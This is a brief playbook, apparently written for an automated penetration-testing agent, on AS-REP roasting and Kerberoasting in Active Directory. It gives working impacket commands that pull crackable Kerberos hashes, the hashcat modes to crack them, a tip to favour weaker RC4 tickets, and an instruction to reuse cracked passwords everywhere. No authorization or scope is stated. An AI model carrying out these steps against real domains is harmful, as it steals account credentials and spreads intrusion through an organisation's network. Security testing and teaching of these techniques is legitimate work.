---
name: roasting
services: [roasting, kerberoast]
summary: AS-REP roasting and Kerberoasting — offline-crackable hashes from the KDC
---

# Roasting playbook

Two credential-access techniques that pull crackable hashes from Kerberos. Use `impacket_kerberos`
(or `local_exec`). The commands below are **examples** — compose your own.

## AS-REP roasting (no credentials needed)
Accounts with "do not require pre-auth" set hand out an AS-REP encrypted with the user's key.
- Example: `impacket-GetNPUsers <domain>/ -dc-ip <dc> -usersfile users.txt -no-pass -format hashcat`
- with creds, find them first: query `userAccountControl` bit `0x400000` via `ldapsearch_query`

look for: `DONT_REQ_PREAUTH` accounts → AS-REP hash → `hashcat_crack` (mode 18200).

## Kerberoasting (needs any domain credential)
Service accounts with an SPN hand out a TGS encrypted with the account's key.
- Example: `impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc> -request -outputfile tgs.txt`

look for: user accounts with a `servicePrincipalName` → TGS hash → `hashcat_crack` (mode 13100).
Prefer RC4 tickets (crack faster); AES-only still cracks, just slower.

## Record
`record_credential` cracked passwords and reuse them everywhere; roastable accounts themselves = finding (high).
